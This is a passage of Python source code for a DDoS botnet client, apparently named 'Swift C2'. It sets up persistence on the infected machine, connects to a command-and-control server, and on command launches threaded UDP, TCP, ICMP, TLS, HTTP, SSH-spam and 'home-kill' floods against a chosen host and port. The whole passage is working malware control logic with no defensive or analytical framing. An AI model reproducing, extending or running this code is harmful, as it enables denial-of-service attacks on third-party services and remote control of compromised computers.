    try:
        port = int(parts[2]); duration = int(parts[3])
        if not (0 < port <= 65535) or duration <= 0: raise ValueError()
    except ValueError: return
    attack_id = f"{method}-{target_host}-{port}"
    with attacks_lock:
        if attack_id in active_attacks and not active_attacks[attack_id].is_set():
            return
    if method == "udp":
        threading.Thread(target=start_udp_flood, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "tcp":
        threading.Thread(target=start_tcp_flood, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "udp-swift":
        threading.Thread(target=start_swiftudp_flood, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "icmp":
        threading.Thread(target=start_icmp_flood, args=(target_host, duration, attack_id), daemon=True).start()
    elif method == "tls-v2":
          threading.Thread(target=start_tls_flood_attack, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "http-swift":
        threading.Thread(target=start_httpvip_attack, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "ssh-spam":
            threading.Thread(target=start_ssh_spam_attack, args=(target_host, port, duration), daemon=True).start()
    elif method == "tcp-swift":
            threading.Thread(target=start_swifttcp_flood, args=(target_host, port, duration, attack_id), daemon=True).start()
    elif method == "http-mix":
        threading.Thread(target=start_http_mix_attack, args=(target_host, port, duration), daemon=True).start()
    elif method == "home-kill":
        threading.Thread(target=start_home_flood, args=(target_host, port, duration), daemon=True).start()
    elif method == "http-v2":
        threading.Thread(target=start_http_v2_attack, args=(target_host, port, duration), daemon=True).start()
    else:
        print(f"Bot: Unknown or disallowed (L7) method received: {method}")

def listen_for_commands(c2_conn):
    buffer = ""
    try:
        ping_interval = BOT_KEEP_ALIVE_INTERVAL / 3
        if ping_interval <=0: ping_interval = 15
        c2_conn.settimeout(ping_interval)
        while not _stop_main_loop.is_set():
            try:
                data = c2_conn.recv(1024)
                if not data:
                    break
                buffer += data.decode('utf-8', errors='ignore')
                while '\n' in buffer:
                    command, buffer = buffer.split('\n', 1)
                    if command.strip():
                        command_handler(command.strip())
            except socket.timeout:
                try:
                    c2_conn.sendall(b'\n')
                except socket.error:
                    break
                continue
            except (socket.error, Exception):
                break
    finally:
        c2_conn.close()

def main_bot_loop():
    global current_c2_ip, current_c2_port
    executable_path = get_executable_path()
    apply_persistence(executable_path)
    while not _stop_main_loop.is_set():
        c2_conn = connect_to_c2()
        if c2_conn:
            listen_for_commands(c2_conn)
        elif _stop_main_loop.is_set():
            break
        if not _stop_main_loop.is_set():
            print(f"Disconnected. Will attempt to re-fetch C2 config and reconnect in {RECONNECT_DELAY}s...")
            for _ in range(RECONNECT_DELAY):
                 if _stop_main_loop.is_set(): break
                 time.sleep(1)
            current_c2_ip = None
            current_c2_port = None

def signal_handler_bot(sig, frame):
    _stop_main_loop.set()
    with attacks_lock:
        for attack_id, stop_event_instance in active_attacks.items():
            if not stop_event_instance.is_set():
                stop_event_instance.set()

if __name__ == "__main__":
    print(f"Swift C2 starting on {platform.system()} {platform.machine()}...")
    signal.signal(signal.SIGINT, signal_handler_bot)
    signal.signal(signal.SIGTERM, signal_handler_bot)
    main_thread = threading.Thread(target=main_bot_loop)
    main_thread.daemon = False
    main_thread.start()
    try:
        while main_thread.is_alive() and not _stop_main_loop.is_set():
            main_thread.join(timeout=1.0)
    except KeyboardInterrupt:
        _stop_main_loop.set()
    if main_thread.is_alive():
        main_thread.join(timeout=5)
    sys.exit(0)
